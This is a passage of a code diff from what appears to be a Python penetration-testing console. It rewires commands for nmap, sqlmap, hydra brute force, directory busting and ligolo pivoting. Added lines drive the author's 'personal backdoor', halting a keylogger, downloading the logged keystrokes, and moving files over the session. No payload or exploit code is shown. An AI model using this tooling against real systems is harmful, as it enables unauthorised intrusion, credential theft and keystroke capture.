+                        #This interacts with my personal backdoor so I do not have to use multihandlers functionality
+                        #comment it out if it bothers you
+                            if not re.search(r"msf", output):
+                                try:
+                                    os.write(master, b"stopkeylog\n")
+                                    print("[-] keylog halted see keyslogged.txt")
+                                    download_selection = input(f"would you like to download the file? (y/n) ").strip()
+                                    if download_selection.lower().startswith("y"):
+                                        try:
+                                            filename = "keyslogged.txt"
+                                            os.write(master, b"sdownload keyslogged.txt\n")
+                                            # Call the receive_file function
+                                            receive_file(filename)
+                                        except Exception as e:
+                                            print(f"[-] Error occurred: {e}")
+
+                                except Exception as e:
+                                    print(f"[-] Error occurred: {e}")
+                            else:
+                                print(f"[-] Non interactive state detected. Please enter an active session")
                                 
                         elif user_input.lower().startswith("generate"):
                             try:
                                 generate_payload()
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
                             except Exception as e:
                                 print(f"[-] Error occurred during scan: {e}")
 
@@ -1518,6 +3213,9 @@ def main():
                             print("*Utilizes sqlmap to attempt sql injection on a target website.*")
                             try:
                                 sqli()
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
                             except Exception as e:
                                 print(f"[-] Error occurred during scan: {e}")
 
@@ -1525,7 +3223,21 @@ def main():
                         elif user_input.lower().startswith("fuzz"):
                             print("*Utilizes ffuf to quickly enumerate endpoints on a target website.*")
                             try:
-                                fuzz()
+                                parts = user_input.split(" ", 1)
+                                if len(parts) == 1:
+                                    url_input = ""
+                                    # Call the csearch function
+                                    fuzz(url_input)
+                                elif len(parts) == 2:
+                                    url_input = parts[1].strip()
+                                    # Call the csearch function
+                                    fuzz(url_input)
+                                else:
+                                    print("[-] Invalid input. Please try again")
+                                    continue
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
                             except Exception as e:
                                 print(f"[-] Error occurred during scan: {e}")
 
@@ -1534,6 +3246,9 @@ def main():
                             print("*Utilizes hydra to preform a brute force attack on a login point.*")
                             try:
                                 login()
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
                             except Exception as e:
                                 print(f"[-] Error occurred during scan: {e}")
 
@@ -1541,33 +3256,43 @@ def main():
                         elif user_input.lower().startswith("scan"):
                             try:
                                 print("*Calls nmap preform a scan of your choosing*")
-                                scan()
+                                parts = user_input.split(" ", 1)
+                                if len(parts) == 1:
+                                    url_input = ""
+                                    # Call the csearch function
+                                    scan(url_input)
+                                elif len(parts) == 2:
+                                    url_input = parts[1].strip()
+                                    # Call the csearch function
+                                    scan(url_input)
+                                else:
+                                    print("[-] Invalid input. Please try again")
+                                    continue
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
                             except Exception as e:
                                 print(f"[-] Error occurred during scan: {e}")
 
-                        # If user enters the 'sbrute' command, utilize subbrute to find subdomains using a 140k wordlist
-                        elif user_input.lower().startswith("sbrute"):
-                            print("*Performs subdomain busting utilizing subbrute with a wordlist to look for subdomains on a target website.*")
-                            print("\nThis scan typically takes 25-40 minutes.\n")
-                            try:
-                                sbrute()
-                            except Exception as e:
-                                print(f"[-] Error occurred during scan: {e}")
-
-                        # If user enters the 'sbust' command, utilize sublister to find subdomains
+                        # If user enters the 'sbust' command, utilize subfinder to find subdomains
                         elif user_input.lower().startswith("sbust"):
-                            print("*Performs quick subdomain busting utilizing Sublist3r to look for subdomains on a target website.*")
+                            print("*Performs quick subdomain busting utilizing subfinder to look for subdomains on a target website.*")
                             try:
-                                sbust()
-                            except Exception as e:
-                                print(f"[-] Error occurred during scan: {e}")
-
-                        # If user enters the 'vulnwebzap' command, utilize owasp-zap to preform a vulnerability scan
-                        elif user_input.lower().startswith("vulnwebzap"):
-                            print("*Calls owasp-zap for web app vulnerability scanning.*")
-                            print("\nThis scan typically takes 10-60 minutes depending on the complexity of the endpoint.\n")
-                            try:
-                                vulnwebzap()
+                                parts = user_input.split(" ", 1)
+                                if len(parts) == 1:
+                                    url_input = ""
+                                    # Call the csearch function
+                                    sbust(url_input)
+                                elif len(parts) == 2:
+                                    url_input = parts[1].strip()
+                                    # Call the csearch function
+                                    sbust(url_input)
+                                else:
+                                    print("[-] Invalid input. Please try again")
+                                    continue
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
                             except Exception as e:
                                 print(f"[-] Error occurred during scan: {e}")
 
@@ -1576,7 +3301,21 @@ def main():
                             print("*Calls nikto for web app vulnerability scanning.*")
                             print("\nThis scan typically takes 5-15 minutes depending on the complexity of the endpoint.\n")
                             try:
-                                vulnwebnikto()
+                                parts = user_input.split(" ", 1)
+                                if len(parts) == 1:
+                                    url_input = ""
+                                    # Call the csearch function
+                                    vulnwebnikto(url_input)
+                                elif len(parts) == 2:
+                                    url_input = parts[1].strip()
+                                    # Call the csearch function
+                                    vulnwebnikto(url_input)
+                                else:
+                                    print("[-] Invalid input. Please try again")
+                                    continue
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
                             except Exception as e:
                                 print(f"[-] Error occurred during scan: {e}")
 
@@ -1585,7 +3324,21 @@ def main():
                             print("*Calls nmap vulners for port based vulnerability scanning.*")
                             print("\nThis scan typically takes 5-10 minutes per host.")
                             try:
-                                vulnport()
+                                parts = user_input.split(" ", 1)
+                                if len(parts) == 1:
+                                    url_input = ""
+                                    # Call the csearch function
+                                    vulnport(url_input)
+                                elif len(parts) == 2:
+                                    url_input = parts[1].strip()
+                                    # Call the csearch function
+                                    vulnport(url_input)
+                                else:
+                                    print("[-] Invalid input. Please try again")
+                                    continue
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
                             except Exception as e:
                                 print(f"[-] Error occurred during scan: {e}")
 
@@ -1594,7 +3347,21 @@ def main():
                             print("*Performs directory busting utilizing dirb to look for hidden directories on a target website.*")
                             print("\nDefault wordlist typically takes 10-15 minutes to run through per directory\n")
                             try:
-                                dbust()
+                                parts = user_input.split(" ", 1)
+                                if len(parts) == 1:
+                                    url_input = ""
+                                    # Call the csearch function
+                                    dbust(url_input)
+                                elif len(parts) == 2:
+                                    url_input = parts[1].strip()
+                                    # Call the csearch function
+                                    dbust(url_input)
+                                else:
+                                    print("[-] Invalid input. Please try again")
+                                    continue
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
                             except Exception as e:
                                 print(f"[-] Error occurred during scan: {e}")
 
@@ -1602,7 +3369,24 @@ def main():
                         elif user_input.lower().startswith("spider"):
                             try:
                                 print("*Crawls the HTML of a target website for interesting endpoints such as .js*")
-                                spider()
+                                parts = user_input.split(" ", 1)
+                                if len(parts) == 1:
+                                    if globaltargetenabled:
+                                        domain = globaltarget
+                                        default_spider(domain)
+                                    url_input = ""
+                                    # Call the csearch function
+                                    spider(url_input)
+                                elif len(parts) == 2:
+                                    domain = parts[1].strip()
+                                    # Call the csearch function
+                                    default_spider(domain)
+                                else:
+                                    print("[-] Invalid input. Please try again")
+                                    continue
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
                             except Exception as e:
                                 print(f"[-] Error occurred during scan: {e}")
 
@@ -1610,7 +3394,21 @@ def main():
                         elif user_input.lower().startswith("ping"):
                             try:
                                 print("*Calls nmap to discover hosts using a ping scan*")
-                                ping()
+                                parts = user_input.split(" ", 1)
+                                if len(parts) == 1:
+                                    url_input = ""
+                                    # Call the csearch function
+                                    ping(url_input)
+                                elif len(parts) == 2:
+                                    url_input = parts[1].strip()
+                                    # Call the csearch function
+                                    ping(url_input)
+                                else:
+                                    print("[-] Invalid input. Please try again")
+                                    continue
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
                             except Exception as e:
                                 print(f"[-] Error occurred during scan: {e}")
 
@@ -1619,6 +3417,9 @@ def main():
                             try:
                                 print("*Does an ARP scan to discover hosts on the local network. (Needs root)*")
                                 arp_function()
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
                             except Exception as e:
                                 print(f"[-] Error occurred during scan: {e}")
 
@@ -1630,6 +3431,9 @@ def main():
                                 subprocess.call(['ifconfig'])
                                 print()
                                 mac_change()
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
                             except Exception as e:
                                 print(f"[-] Error occurred: {e}")
 
@@ -1647,29 +3451,196 @@ def main():
                             except Exception as e:
                                 print(f"[-]Error occurred: {e}")
 
-                        elif user_input.lower().startswith("vdownload"):
+                        elif user_input.lower().startswith("checkall"):
+                            print(f"*Runs default scans & checks*")
+                            try:
+                                parts = user_input.split(" ", 1)
+                                if len(parts) == 1:
+                                    url_input = ""
+                                    # Call the csearch function
+                                    checkall(url_input)
+                                elif len(parts) == 2:
+                                    url_input = parts[1].strip()
+                                    # Call the csearch function
+                                    checkall(url_input)
+                                else:
+                                    print("[-] Invalid input. Please try again")
+                                    continue
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
+                            except Exception as e:
+                                print(f"[-]Error occurred: {e}")
+
+                        elif user_input.lower().startswith("checkexploits"):
+                            print("")
+                            print(f"*Checks for CVE's that I have an exploit script for*")
+                            print("")
+                            try:
+                                parts = user_input.split(" ", 1)
+                                if len(parts) == 1:
+                                    url_input = ""
+                                    # Call the csearch function
+                                    check_cve_main(url_input)
+                                elif len(parts) == 2:
+                                    url_input = parts[1].strip()
+                                    # Call the csearch function
+                                    check_cve_main(url_input)
+                                else:
+                                    print("[-] Invalid input. Please try again")
+                                    continue
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
+                            except Exception as e:
+                                print(f"[-]Error occurred: {e}")
+
+                        elif user_input.lower().startswith("checkendpoints"):
+                            try:
+                                parts = user_input.split(" ", 1)
+                                if len(parts) == 1:
+                                    url_input = ""
+                                     #Call the csearch function
+                                    checkendpoints_main(url_input)
+                                elif len(parts) == 2:
+                                    url_input = parts[1].strip()
+                                     #Call the csearch function
+                                    checkendpoints_main(url_input)
+                                else:
+                                    print("[-] Invalid input. Please try again")
+                                    continue
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
+                            except Exception as e:
+                                print(f"[-] An error occurred: {e}")
+
+                        elif user_input.lower().strip().startswith("checkports"):
+                            try:
+                                parts = user_input.split(" ", 1)
+                                if len(parts) == 1:
+                                    url_input = ""
+                                    # Call the csearch function
+                                    checkports_main(url_input)
+                                elif len(parts) == 2:
+                                    url_input = parts[1].strip()
+                                    # Call the csearch function
+                                    checkports_main(url_input)
+                                else:
+                                    print("[-] Invalid input. Please try again")
+                                    continue
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
+                            except Exception as e:
+                                print(f"[-] An error occurred: {e}")
+
+                        elif user_input.lower().startswith("enable default"):
+                            try:
+                                parts = user_input.split(" ", 2)
+                                if len(parts) in [1, 2]:
+                                    url_input = ""
+                                    #Call the csearch function
+                                    enable_global_target(url_input)
+                                elif len(parts) == 3:
+                                    url_input = parts[2].strip()
+                                    #Call the csearch function
+                                    enable_global_target(url_input)
+                                else:
+                                    print("[-] Invalid input. Please try again")
+                                    continue
+                            except Exception as e:
+                                print(f"[-] An error occurred: {e}")
+
+                        elif user_input.lower().startswith("disable default"):
+                            try:
+                                disable_global_target()
+                            except Exception as e:
+                                print(f"[-] An error occurred: {e}")
+
+                        elif user_input.lower().startswith("vsearch"):
+                            try:
+                                parts = user_input.split(" ", 1)
+                                if len(parts) != 2:
+                                    print("[-] Invalid input please use 'vsearch [keywords]'")
+                                    continue
+                                search_input = parts[1].strip()
+                                # Call the csearch function
+                                vsearch(search_input)
+                            except Exception as e:
+                                print(f"[-] An error occurred: {e}")
+
+                        elif user_input.lower().strip().startswith("qr"):
+                            try:
+                                parts = user_input.split(" ", 1)
+                                if len(parts) == 1:
+                                    url_input = ""
+                                    generate_qr_code(url_input)
+                                elif len(parts) == 2:
+                                    url_input = parts[1].strip()
+                                    generate_qr_code(url_input)
+                                else:
+                                    print("[-] Invalid input. Please try again")
+                                    continue
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
+                            except Exception as e:
+                                print(f"[-] An error occurred: {e}")
+
+                        elif user_input.lower().startswith("show schedule"):
+                            try:
+                                print_scheduled_commands()
+                            except Exception as e:
+                                print(f"[-] An error occurred: {e}")
+
+                        elif user_input.lower().startswith("cancel last"):
+                            try:
+                                cancel_scheduled_command(command)
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
+                            except Exception as e:
+                                print(f"[-] Error occurred during scan: {e}")
+
+                        elif user_input.lower().startswith("cancel all"):
+                            try:
+                                cancel_all_scheduled_commands()
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
+                            except Exception as e:
+                                print(f"[-] Error occurred during scan: {e}")
+
+                        elif user_input.lower().startswith("sdownload"):
                         #This interacts with my personal backdoor so I do not have to use multihandlers functionality
                         #comment it out if it bothers you
-                            try:
-                                os.write(master, user_input.encode())
-                                parts = user_input.split(" ", 1)
-                                filename = parts[1].strip()
-                                # Call the receive_file function
-                                receive_file(filename)
-                            except Exception as e:
-                                print(f"[-] Error occurred: {e}")
+                            if not re.search(r"msf", output):
+                                try:
+                                    os.write(master, user_input.encode())
+                                    parts = user_input.split(" ", 1)
+                                    filename = parts[1].strip()
+                                    # Call the receive_file function
+                                    receive_file(filename)
+                                except Exception as e:
+                                    print(f"[-] Error occurred: {e}")
+                            else:
+                                print(f"[-] Non interactive state detected. Please enter an active session")
                                     
-                        elif user_input.lower().startswith("vupload"):
+                        elif user_input.lower().startswith("supload"):
                         #This interacts with my personal backdoor so I do not have to use multihandlers functionality
                         #comment it out if it bothers you
-                            try:
-                                os.write(master, user_input.encode())
-                                parts = user_input.split(" ", 1)
-                                filename = parts[1].strip()
-                                # Call the send_file function to initiate the upload
-                                send_file(filename)
-                            except Exception as e:
-                                print(f"[-] Error occurred: {e}")
+                            if not re.search(r"msf", output):
+                                try:
+                                    os.write(master, user_input.encode())
+                                    parts = user_input.split(" ", 1)
+                                    filename = parts[1].strip()
+                                    # Call the send_file function to initiate the upload
+                                    send_file(filename)
+                                except Exception as e:
+                                    print(f"[-] Error occurred: {e}")
+                            else:
+                                print(f"[-] Non interactive state detected. Please enter an active session")
                                     
                         elif user_input.lower().startswith("pivot"):
                             print("*Utilizes ligolo to set up a tunnel into internal network*")
@@ -1678,6 +3649,9 @@ def main():
                                 try:
                                     route(master)
                                     ligoloup = True
+                                except KeyboardInterrupt:
+                                    print("[-] KeyboardInterrupt detected. Moving on...")
+                                    print(" ")
                                 except Exception as e:
                                     print(f"[-] Error occurred: {e}")
                             else:
